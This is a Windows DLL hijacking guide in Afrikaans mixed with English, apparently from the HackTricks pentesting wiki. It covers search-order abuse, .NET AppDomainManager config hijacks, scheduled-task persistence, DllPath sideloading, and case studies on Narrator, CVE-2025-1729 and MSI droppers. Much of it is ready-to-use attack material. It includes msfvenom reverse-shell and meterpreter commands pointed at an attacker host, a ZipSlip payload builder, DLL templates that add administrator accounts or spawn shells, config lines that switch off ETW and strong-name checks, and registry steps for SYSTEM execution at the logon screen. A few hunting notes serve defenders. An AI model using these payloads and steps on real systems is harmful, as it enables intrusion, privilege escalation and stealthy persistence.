# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Basiese Inligting

DLL Hijacking behels die manipulasie van ’n vertroude toepassing om ’n kwaadwillige DLL te laai. Hierdie term sluit verskeie taktieke in soos **DLL Spoofing, Injection, en Side-Loading**. Dit word hoofsaaklik gebruik vir code execution, die verkryging van persistence, en, minder dikwels, privilege escalation. Ten spyte van die fokus op escalation hier, bly die hijacking-metode konsekwent oor doelwitte heen.

### Algemene Tegnieke

Verskeie metodes word gebruik vir DLL hijacking, elk met sy doeltreffendheid afhangend van die toepassing se DLL-laaistastrategie:

1. **DLL Replacement**: Vervang ’n egte DLL met ’n kwaadwillige een, opsioneel met DLL Proxying om die oorspronklike DLL se funksionaliteit te behou.
2. **DLL Search Order Hijacking**: Plaas die kwaadwillige DLL in ’n soekpad voor die wettige een, en ontgin die toepassing se soekpatroon.
3. **Phantom DLL Hijacking**: Skep ’n kwaadwillige DLL vir ’n toepassing om te laai, omdat dit dink dit is ’n vereiste DLL wat nie bestaan nie.
4. **DLL Redirection**: Wysig soekparameters soos `%PATH%` of `.exe.manifest` / `.exe.local` lêers om die toepassing na die kwaadwillige DLL te lei.
5. **WinSxS DLL Replacement**: Vervang die wettige DLL met ’n kwaadwillige eweknie in die WinSxS-gids, ’n metode wat dikwels met DLL side-loading geassosieer word.
6. **Relative Path DLL Hijacking**: Plaas die kwaadwillige DLL in ’n gebruiker-beheerde gids saam met die gekopieerde toepassing, soortgelyk aan Binary Proxy Execution tegnieke.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Klassieke DLL sideloading is nie die enigste manier om ’n vertroude **.NET Framework** proses te laat attacker code laai nie. As die teiken-uitvoerbare lêer ’n **managed** toepassing is, raadpleeg die CLR ook ’n **application configuration file** wat na die uitvoerbare lêer vernoem is (byvoorbeeld `Setup.exe.config`). Daardie lêer kan ’n pasgemaakte **AppDomainManager** definieer. As die config na ’n attacker-beheerde assembly wys wat langs die EXE geplaas is, laai die CLR dit **voor die toepassing se normale code path** en dit loop binne die vertroude proses.

Volgens Microsoft se .NET Framework configuration schema moet beide `<appDomainManagerAssembly>` en `<appDomainManagerType>` teenwoordig wees vir die pasgemaakte manager om gebruik te word.

Minimal config:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Minimale bestuurder:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Praktiese notas:
- Dit is **.NET Framework specific** tradecraft. Dit hang af van CLR config parsing, nie van die Win32 DLL search order nie.
- Die host moet regtig ’n **managed EXE** wees. Vinnige triage: `sigcheck -m target.exe`, `corflags target.exe`, of kyk vir die **CLR Runtime Header** in PE metadata.
- Die config filename moet presies ooreenstem met die executable name (`<binary>.config`) en leef gewoonlik **langs die EXE**.
- Dit is nuttig met **signed Microsoft/vendor binaries** omdat die vertroude EXE onaangeraak bly terwyl die malicious managed assembly in-process execute.
- As jy reeds ’n writable installer/update directory het, kan AppDomainManager hijacking as die **first stage** gebruik word, gevolg deur classic DLL sideloading of reflective loading vir latere stages.

### Hijacking an existing scheduled task to relaunch the sideload chain

Vir persistence, kyk nie net na **creating a new task** nie. Sommige intrusion sets wag totdat ’n legitimate installer ’n **normal updater task** skep en **rewrite dan die task action** sodat die bestaande name, author, en trigger vertroud bly vir defenders.

Reusable workflow:
1. Install/run die legitimate software en identifiseer die task wat dit normaalweg skep.
2. Export die task XML en let op die huidige `<Exec><Command>` / `<Arguments>` values.
3. Vervang net die action sodat die task jou **trusted host EXE** vanaf ’n user-writable staging directory begin, wat dan side-load of AppDomain-load die real payload.
4. Re-register dieselfde task name in plaas daarvan om ’n nuwe obvious persistence artifact te skep.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Waarom dit meer stealth is:
- Die taaknaam kan steeds legitiem lyk (byvoorbeeld ’n vendor updater).
- Die **Task Scheduler service** lanseer dit, so parent/ancestor-validasie sien dikwels die verwagte scheduling chain in plaas van `explorer.exe`.
- DFIR-spanne wat net vir **nuwe taakname** soek, kan ’n taak mis waarvan die registrasie reeds bestaan het maar waarvan die action nou na `%LOCALAPPDATA%`, `%APPDATA%`, of ’n ander attacker-controlled path wys.

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Vergelyk `C:\Windows\System32\Tasks\*` XML en `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata teen ’n baseline.
- Alert wanneer ’n **vendor-looking updater task** vanaf **user-writable directories** uitvoer of ’n .NET EXE met ’n colocated `*.config` file lanseer.

> [!TIP]
> Vir ’n step-by-step chain wat HTML staging, AES-CTR configs, en .NET implants bo-op DLL sideloading laag, review die workflow hieronder.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Finding missing Dlls

Die mees algemene manier om missing Dlls binne ’n system te vind is om [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) vanaf sysinternals te hardloop, **en** die **volgende 2 filters** te **stel**:

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: The most common way to find missing Dlls inside a system is running procmon from sysinternals, setting the following 2 filters](<../../../images/image (230).png>)

en wys net die **File System Activity**:

![Common Techniques - Finding missing Dlls: and just show the File System Activity](<../../../images/image (153).png>)

As jy vir **missing dlls in general** soek, **laat** jy dit vir ’n paar **sekondes** loop.\
As jy vir ’n **missing dll inside an specific executable** soek, moet jy **’n ander filter stel soos "Process Name" "contains" `<exec name>`, dit uitvoer, en ophou om events vas te vang**.

## Exploiting Missing Dlls

Om privileges te eskaleer, is die beste kans wat ons het om ’n **dll te skryf wat ’n privilege process sal probeer laai** in ’n plek waar dit gaan gesoek word. Daarom sal ons ’n **dll kan skryf** in ’n **folder** waar die **dll voor** die folder gesoek word waar die **original dll** is (weird case), of ons sal in staat wees om te **skryf na** ’n **folder waar die dll gesoek gaan word** en die original **dll** bestaan nie in enige folder nie.

### Dll Search Order

**Binne die** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **kan jy vind hoe die Dlls spesifiek gelaai word.**

**Windows applications** soek na DLLs deur ’n stel **pre-defined search paths** te volg, in ’n spesifieke volgorde. Die probleem van DLL hijacking ontstaan wanneer ’n kwaadwillige DLL strategies in een van hierdie directories geplaas word, wat verseker dat dit voor die outentieke DLL gelaai word. ’n Oplossing om dit te voorkom is om seker te maak die application gebruik absolute paths wanneer daar na die DLLs verwys word wat dit benodig.

Jy kan die **DLL search order on 32-bit** systems hieronder sien:

1. Die directory vanwaar die application gelaai is.
2. Die system directory. Gebruik die [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function om die path van hierdie directory te kry.(_C:\Windows\System32_)
3. Die 16-bit system directory. Daar is geen function wat die path van hierdie directory verkry nie, maar dit word gesoek. (_C:\Windows\System_)
4. Die Windows directory. Gebruik die [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function om die path van hierdie directory te kry.
1. (_C:\Windows_)
5. Die current directory.
6. Die directories wat in die PATH environment variable gelys is. Let daarop dat dit nie die per-application path insluit wat deur die **App Paths** registry key gespesifiseer word nie. Die **App Paths** key word nie gebruik wanneer die DLL search path bereken word nie.

Dit is die **default** search order met **SafeDllSearchMode** geaktiveer. Wanneer dit gedeaktiveer is, skuif die current directory na tweede plek. Om hierdie feature te deaktiveer, skep die **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value en stel dit na 0 (default is enabled).

As [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function met **LOAD_WITH_ALTERED_SEARCH_PATH** geroep word, begin die search in die directory van die executable module wat **LoadLibraryEx** laai.

Ten slotte, let daarop dat **’n dll gelaai kan word deur die absolute path aan te dui in plaas van net die naam**. In daardie geval gaan daardie dll **slegs in daardie path gesoek word** (as die dll enige dependencies het, gaan hulle gesoek word soos net gelaai deur name).

Daar is ander maniere om die search order te verander, maar ek gaan hulle nie hier verduidelik nie.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Gebruik **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) om DLL name te versamel wat die process probe maar nie kan vind nie.
2. As die binary op ’n **schedule/service** loop, sal die dropping van ’n DLL met een van daardie name in die **application directory** (search-order entry #1) op die volgende execution gelaai word. In een .NET scanner case het die process vir `hostfxr.dll` in `C:\samples\app\` gesoek voor dit die regte copy vanaf `C:\Program Files\dotnet\fxr\...` gelaai het.
3. Bou ’n payload DLL (byvoorbeeld reverse shell) met enige export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. As jou primitive ’n **ZipSlip-style arbitrary write** is, craft ’n ZIP waarvan die entry uit die extraction dir ontsnap sodat die DLL in die app folder land:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Lewer die argief aan die gemonitorde inbox/share; wanneer die geskeduleerde taak die proses herbegin, laai dit die kwaadwillige DLL en voer jou kode uit as die service account.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

’n Gevorderde manier om die DLL-soekpad van ’n nuutgeskepte proses deterministies te beïnvloed, is om die DllPath-veld in RTL_USER_PROCESS_PARAMETERS te stel wanneer die proses met ntdll se native APIs geskep word. Deur hier ’n attacker-controlled gids te verskaf, kan ’n teikenproses wat ’n imported DLL by naam oplos (geen absolute path en nie die safe loading flags gebruik nie) gedwing word om ’n kwaadwillige DLL uit daardie gids te laai.

Key idea
- Bou die process parameters met RtlCreateProcessParametersEx en verskaf ’n custom DllPath wat na jou controlled folder wys (bv. die gids waar jou dropper/unpacker leef).
- Skep die proses met RtlCreateUserProcess. Wanneer die teiken-binêre ’n DLL by naam oplos, sal die loader hierdie verskafde DllPath tydens resolusie raadpleeg, wat betroubare sideloading moontlik maak selfs wanneer die kwaadwillige DLL nie saam met die teiken EXE geleë is nie.

Notes/limitations
- Dit beïnvloed die child process wat geskep word; dit verskil van SetDllDirectory, wat net die current process beïnvloed.
- Die teiken moet ’n DLL by naam import of LoadLibrary (geen absolute path en nie LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories gebruik nie).
- KnownDLLs en hardcoded absolute paths kan nie hijack word nie. Forwarded exports en SxS kan precedence verander.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operasionele gebruiksvoorbeeld
- Plaas ’n kwaadwillige xmllite.dll (wat die vereiste funksies export of na die regte een proxy) in jou DllPath-gids.
- Begin ’n signed binary wat bekend is daarvoor om xmllite.dll by name op te soek met die bogenoemde tegniek. Die loader los die import via die verskafte DllPath op en sideload jou DLL.

Hierdie tegniek is in-the-wild waargeneem om multi-stage sideloading chains aan te dryf: ’n aanvanklike launcher laat val ’n helper DLL, wat dan ’n Microsoft-signed, hijackable binary met ’n custom DllPath laat spawn om loading van die attacker se DLL vanuit ’n staging directory af te dwing.


### .NET AppDomainManager hijacking via `.exe.config`

Vir **.NET Framework** targets kan sideloading **voor `Main()`** gedoen word sonder memory patching deur die toepassing se aangrensende **`.exe.config`**-lêer te misbruik. In plaas daarvan om slegs op die Win32 DLL search order te steun, plaas die attacker ’n legitieme .NET EXE langs ’n kwaadwillige config en een of meer attacker-controlled assemblies.

Hoe die chain werk:
1. Die host EXE begin en die **CLR lees `<exe>.config`**.
2. Die config stel **`<appDomainManagerAssembly>`** en **`<appDomainManagerType>`** in sodat die runtime ’n attacker-controlled `AppDomainManager` instansieer.
3. Die kwaadwillige manager kry **pre-`Main()` execution** binne die trusted host process.
4. Dieselfde config kan die CLR dwing om local assemblies eerste op te los (byvoorbeeld `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) en kan runtime validation/telemetry verswak sonder inline patching.

Campaign-style patroon (presiese nesting kan verskil volgens directive / CLR version):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Waarom dit nuttig is:
- **`<probing privatePath="."/>`** hou assembly resolution in die application directory, wat die folder in 'n voorspelbare sideloading surface verander.
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** skuif execution na attacker code tydens CLR initialization, voordat die legit app logic loop.
- **`<bypassTrustedAppStrongNames enabled="true"/>`** kan 'n full-trust app toelaat om unsigned of tampered assemblies te laai sonder 'n strong-name validation failure.
- **`<publisherPolicy apply="no"/>`** vermy publisher-policy redirects na nuwer assemblies.
- **`<requiredRuntime ... safemode="true"/>`** maak runtime selection meer deterministic.
- **`<etwEnable enabled="false"/>`** is veral interessant omdat die **CLR sy eie ETW visibility deaktiveer** vanuit configuration in plaas daarvan dat die implant `EtwEventWrite` in memory patch.

Operasionele patroon wat in onlangse campaigns gesien is:
- Stage 1 laat val `setup.exe`, `setup.exe.config`, en local assemblies.
- Stage 2 kopieer hulle na 'n geloofwaardige **AppData update** folder, hernoem die host na iets soos `update.exe`, en launch dit weer via 'n **scheduled task**.
- Stage 3 verifieer execution context (byvoorbeeld verwagte parent `svchost.exe` vanaf Task Scheduler) voordat die finale RAT DLL/export gelaai word.

Hunting-idees:
- Signed of andersins legit **.NET executables** wat loop met verdagte naburige **`.config`** files in user-writable locations.
- `.config` files wat **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, of **`etwEnable enabled="false"`** bevat.
- Scheduled tasks wat hernoemde update binaries vanaf **`%LOCALAPPDATA%`** of app-spesifieke `\bin\update\` directories weer launch.
- Parent/child chains waar 'n scheduled task 'n trusted .NET host launch wat onmiddellik non-vendor assemblies uit sy eie directory laai.

#### Exceptions on dll search order from Windows docs

Sekere uitsonderings op die standaard DLL search order word in Windows documentation genoem:

- Wanneer 'n **DLL wat sy naam deel met een wat reeds in memory gelaai is** teëgekom word, slaan die system die gewone search oor. In plaas daarvan doen dit 'n check vir redirection en 'n manifest voordat dit by verstek die DLL wat reeds in memory is gebruik. **In hierdie scenario doen die system nie 'n search vir die DLL nie**.
- In gevalle waar die DLL erken word as 'n **known DLL** vir die huidige Windows version, sal die system sy version van die known DLL gebruik, saam met enige van sy dependent DLLs, **en die search process laat vaar**. Die registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** hou 'n lys van hierdie known DLLs.
- As 'n **DLL dependencies het**, word die search vir hierdie dependent DLLs uitgevoer asof hulle slegs deur hul **module names** aangedui is, ongeag of die aanvanklike DLL deur 'n full path geïdentifiseer is.

### Escalating Privileges

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** **searched for** sal word. Hierdie location kan die directory van die executable wees of 'n directory binne die system path.

Ja, die vereistes is ingewikkeld om te vind, want **by default is dit nogal vreemd om 'n privileged executable te vind wat 'n dll mis nie** en dit is selfs **meer vreemd om write permissions op 'n system path folder te hê** (jy kan nie by default nie). Maar in misconfigured environments is dit moontlik.\
As jy gelukkig is en jy bevind jou by die vereistes, kan jy die [UACME](https://github.com/hfiref0x/UACME) project nagaan. Selfs al is die **main goal of the project is bypass UAC**, kan jy daar 'n **PoC** van 'n Dll hijaking vir die Windows version vind wat jy kan gebruik (waarskynlik net deur die path van die folder waar jy write permissions het te verander).

Let daarop dat jy **jou permissions in 'n folder kan check** deur:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
En **kontroleer die permissies van alle vouers binne PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Jy kan ook die imports van 'n executable en die exports van 'n dll nagaan met:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Vir 'n volledige gids oor hoe om **Dll Hijacking te abuse om privileges te escalate** met permissions om in 'n **System Path folder** te write, check:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)sal check of jy write permissions op enige folder binne system PATH het.\
Ander interessante automated tools om hierdie vulnerability te discover is **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ en _Write-HijackDll._

### Example

In case jy 'n exploitable scenario vind, een van die belangrikste dinge om dit suksesvol te exploit sou wees om 'n **dll te create wat minstens al die functions export wat die executable daarvan sal import**. Anyway, note dat Dll Hijacking handig is om [van Medium Integrity level na High te escalate **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) of van[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Jy kan 'n example vind van **how to create a valid dll** binne hierdie dll hijacking study wat fokus op dll hijacking vir execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Verder kan jy in die **next sectio**n sommige **basic dll codes** vind wat nuttig kan wees as **templates** of om 'n **dll met nie vereiste functions exported** te create.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basies is 'n **Dll proxy** 'n Dll wat in staat is om jou malicious code uit te execute wanneer dit loaded word, maar ook om **te expose** en **te work** soos **expected** deur **al die calls na die real library te relay**.

Met die tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) of [**Spartacus**](https://github.com/Accenture/Spartacus) kan jy actually **'n executable aandui en die library select** wat jy wil proxify en **'n proxified dll genereer** of **die Dll aandui** en **'n proxified dll genereer**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Kry 'n meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Skep 'n gebruiker (x86 ek het nie 'n x64-weergawe gesien nie):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Jou eie

Let op dat in verskeie gevalle die Dll wat jy saamstel **verskeie funksies moet uitvoer** wat deur die slagoffernproses gelaai gaan word; as hierdie funksies nie bestaan nie, sal die **binary hulle nie kan laai** nie en die **exploit sal misluk**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL example with user creation</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatiewe C DLL met thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Gevallestudie: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe ondersoek steeds by opstart ’n voorspelbare, taalspesifieke localization DLL wat gehijack kan word vir arbitrêre code execution en persistence.

Sleutel feite
- Probe path (huidige builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (ouer builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- As ’n skryfbare attacker-controlled DLL by die OneCore path bestaan, word dit gelaai en `DllMain(DLL_PROCESS_ATTACH)` voer uit. Geen exports word vereis nie.

Ontdekking met Procmon
- Filter: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Start Narrator en let op die poging om die bogenoemde path te laai.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC stilte
- ’n Naïewe hijack sal UI praat/uitlig. Om stil te bly, enumereer by attach Narrator threads, open die hoof thread (`OpenThread(THREAD_SUSPEND_RESUME)`) en `SuspendThread` dit; gaan voort in jou eie thread. Sien PoC vir volle code.

Trigger en persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Met bogenoemde, laai die start van Narrator die geplante DLL. Op die secure desktop (logon screen), druk CTRL+WIN+ENTER om Narrator te start; jou DLL execute as SYSTEM op die secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Laat classic RDP security layer toe: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP na die host, by die logon screen druk CTRL+WIN+ENTER om Narrator te launch; jou DLL execute as SYSTEM op die secure desktop.
- Execution stop wanneer die RDP session sluit—inject/migrate prompt.

Bring Your Own Accessibility (BYOA)
- Jy kan ’n ingeboude Accessibility Tool (AT) registry entry clone (bv. CursorIndicator), dit edit om na ’n arbitrary binary/DLL te point, dit import, en dan `configuration` na daardie AT name set. Dit proxy arbitrary execution onder die Accessibility framework.

Notes
- Writing onder `%windir%\System32` en changing HKLM values require admin rights.
- Alle payload logic kan in `DLL_PROCESS_ATTACH` live; geen exports is needed nie.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Hierdie case demonstreer **Phantom DLL Hijacking** in Lenovo se TrackPoint Quick Menu (`TPQMAssistant.exe`), getrack as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` geleë by `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` run daagliks om 9:30 AM onder die context van die ingelogde user.
- **Directory Permissions**: Writable deur `CREATOR OWNER`, wat local users toelaat om arbitrary files te drop.
- **DLL Search Behavior**: Probeer om `hostfxr.dll` eerste uit sy working directory te load en log "NAME NOT FOUND" as dit ontbreek, wat local directory search precedence aandui.

### Exploit Implementation

’n Attacker kan ’n malicious `hostfxr.dll` stub in dieselfde directory plaas, en die missing DLL exploit om code execution onder die user se context te kry:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Attack Flow

1. As 'n standaardgebruiker, laat val `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Wag vir die scheduled task om te loop om 9:30 VM onder die huidige gebruiker se konteks.
3. As 'n administrator aangemeld is wanneer die task uitvoer, loop die malicious DLL in die administrator se session met medium integrity.
4. Chain standaard UAC bypass techniques om van medium integrity na SYSTEM privileges te elevate.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors koppel gereeld MSI-based droppers met DLL side-loading om payloads onder 'n trusted, signed process uit te voer.

Chain overview
- User laai MSI af. 'n CustomAction loop stilweg tydens die GUI install (bv. LaunchApplication of 'n VBScript action), en reconstruct die volgende stage vanaf embedded resources.
- Die dropper skryf 'n legitimate, signed EXE en 'n malicious DLL na dieselfde directory (voorbeeldpaar: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
